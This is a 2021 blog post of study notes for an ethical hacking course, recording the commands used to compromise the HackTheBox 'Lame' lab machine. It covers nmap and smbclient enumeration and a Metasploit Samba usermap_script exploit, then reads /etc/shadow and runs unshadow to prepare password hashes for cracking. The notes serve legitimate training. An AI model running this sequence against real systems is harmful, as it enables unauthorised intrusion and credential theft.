---
layout:     post
title:      TCM PEH Hacking Lame Notes
date:       2021-03-12
summary:    TheCyberMentor's Practical Ethical Hacking course, HackTheBox Lame notes
categories: certs
thumbnail: cogs
tags:
 - htb
 - certs
---


<h2 class="code-line" data-line-start=0 data-line-end=1 ><a id="HTB_Lame_0"></a>HTB Lame</h2>
<p class="has-line-data" data-line-start="1" data-line-end="2">Again, recording commands to derive methodology</p>
<p class="has-line-data" data-line-start="3" data-line-end="14">nmap -A -T4 -p- 10.10.10.3<br>
OR<br>
nmap -T4 -p- 10.10.10.3<br>
Then<br>
nmap -A -T4 -p21,80,443,etc 10.10.10.3<br>
Is much faster<br>
Noted port 21 anonymous login is allowed<br>
Noted port 139 version<br>
Noted port 445 version<br>
Noted port 3632 version<br>
Noted Ubuntu OS</p>
<hr>
<p class="has-line-data" data-line-start="15" data-line-end="28">smbclient -L \\10.10.10.3\<br>
enter<br>
Noted IPC$<br>
Noted Admin$<br>
Noted tmp<br>
smbclient \\10.10.10.3\tmp<br>
enter<br>
ls<br>
dead end<br>
smbclient \\10.10.10.3\opt<br>
and<br>
smbclient \\10.10.10.3\ADMIN$<br>
can’t authenticate, dead end</p>
<hr>
<p class="has-line-data" data-line-start="29" data-line-end="33">Googled samba version 3.0.20-debian exploit<br>
Noted rapid7 link<br>
Noted exploit-db link<br>
Read rapid7 link</p>
<hr>
<p class="has-line-data" data-line-start="34" data-line-end="53">systemctl postgresql enable<br>
systemctl postgresql start<br>
msfconsole<br>
use exploit/multi/samba/usermap_script<br>
options<br>
set rhost 10.10.10.3<br>
show targets<br>
exploit<br>
whoami<br>
hostname<br>
pwd<br>
cd home<br>
ls<br>
cd …/<br>
ls<br>
locate root.txt<br>
updatedb<br>
locate root.txt<br>
locate user.txt</p>
<hr>
<p class="has-line-data" data-line-start="54" data-line-end="60">cat /etc/passwd<br>
cat /etc/shadow<br>
Copy /etc/passwd, paste into file<br>
Copy /etc/shadow, paste into another file<br>
unshadow /path/to/passwd path/to/shadow<br>
See “cracking linux password hashes” videos for more info</p>


